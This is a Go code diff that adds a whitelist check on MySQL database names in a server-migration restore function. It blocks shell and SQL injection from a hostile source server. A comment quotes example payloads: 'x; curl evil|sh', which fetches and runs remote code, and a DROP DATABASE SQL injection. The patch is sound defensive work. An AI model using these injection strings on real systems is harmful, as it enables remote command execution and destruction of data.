@@ -744,8 +744,37 @@ func RemoteMySQLDump(ctx context.Context, host string, port int, user, pass, dbN
 	return nil
 }
 
+// isSafeMySQLName reports whether s is a safe, bare MySQL database identifier.
+// Database names are discovered by running `SHOW DATABASES` on the SOURCE
+// server (DiscoverMySQLDatabases), so on a migration FROM a hostile/compromised
+// box the name is attacker-controlled. It then flows into a local
+// `bash -c "gunzip … | mysql <name>"` (shell) and a `CREATE DATABASE `<name>``
+// (SQL identifier) on the DESTINATION, both as root — a name like
+// `x; curl evil|sh` or `x`; DROP DATABASE serverpanel; -- ` would inject there.
+// A legitimate MySQL database name never needs characters outside this set, so
+// gate on it and refuse anything else rather than trying to escape it.
+func isSafeMySQLName(s string) bool {
+	if s == "" || len(s) > 64 {
+		return false
+	}
+	for _, r := range s {
+		if !((r >= 'a' && r <= 'z') || (r >= 'A' && r <= 'Z') ||
+			(r >= '0' && r <= '9') || r == '_' || r == '$' || r == '-') {
+			return false
+		}
+	}
+	return true
+}
+
 // RestoreMySQL restores a MySQL dump on the local server.
 func RestoreMySQL(ctx context.Context, dbName, archivePath string) error {
+	// Security: dbName is source-controlled on a migration (see isSafeMySQLName)
+	// and is interpolated, unquoted, into both a shell pipeline and a SQL
+	// identifier below — reject any unsafe name so a hostile source can't run
+	// commands / SQL as root on this destination.
+	if !isSafeMySQLName(dbName) {
+		return fmt.Errorf("refusing to restore database with unsafe name %q", dbName)
+	}
 	// Create database if not exists
 	RunCommand(ctx, "mysql", "-e", fmt.Sprintf("CREATE DATABASE IF NOT EXISTS `%s`;", dbName))
 	// Restore from gzipped dump
